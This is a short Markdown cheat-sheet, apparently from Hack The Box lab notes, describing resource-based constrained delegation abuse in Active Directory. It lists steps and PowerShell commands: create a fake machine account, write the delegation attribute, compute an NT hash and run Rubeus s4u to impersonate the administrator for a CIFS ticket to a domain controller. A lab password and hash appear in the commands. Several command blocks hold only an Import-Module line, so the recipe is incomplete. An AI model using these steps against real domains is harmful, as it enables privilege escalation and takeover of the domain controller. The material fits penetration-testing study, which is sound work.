# 09.12 RBCD Resource-Based Constrained Delegation Windows

> Create a fake computer via `Powermad`, write the RBCD SDDL with `Set-DomainObject`, then `Rubeus s4u` for a CIFS impersonation ticket.

## Overview

RBCD requires GenericWrite (or equivalent) over a computer object to write the msDS-AllowedToActOnBehalfOfOtherIdentity attribute, plus control of an object with an SPN. Powermad's New-MachineAccount creates the fake computer; a PowerShell SDDL descriptor is built and written via Set-DomainObject; Rubeus hash computes the NT hash; Rubeus s4u performs the S4U chain for a CIFS ticket. The attribute is cleared afterward with Set-DomainObject -Clear.

## Steps

- Run the SearchRBCD.ps1 enumeration script to find users with GenericAll/GenericWrite/WriteProperty/WriteDACL on computer objects.
- Create a fake machine account with Powermad New-MachineAccount.
- Build an SDDL security descriptor referencing the new computer's SID, convert to bytes, write to the target computer's msDS-AllowedToActOnBehalfOfOtherIdentity with Set-DomainObject using the privileged credential.
- Compute the new machine account's NT hash with Rubeus hash.
- Run Rubeus s4u /user:HACKTHEBOX$ /rc4: /impersonateuser:administrator /msdsspn:cifs/dc01 /ptt.
- Clean up: Set-DomainObject -Clear msDS-AllowedToActOnBehalfOfOtherIdentity.

## Commands

### Powermad create machine account

```powershell
Import-Module .\Powermad.ps1
```

### Write RBCD attribute via PowerView

```powershell
Import-Module .\PowerView.ps1
```

### Rubeus hash compute

```powershell
.\Rubeus.exe hash /password:Hackthebox123+! /user:HACKTHEBOX$ /domain:<DOMAIN>.local
```

### Rubeus S4U RBCD impersonation

```powershell
.\Rubeus.exe s4u /user:HACKTHEBOX$ /rc4:CF767C9A9C529361F108AA67BF1B3695 /impersonateuser:administrator /msdsspn:cifs/dc01.<DOMAIN>.local /ptt
```

### Clear RBCD attribute

```powershell
Import-Module .\PowerView.ps1
```
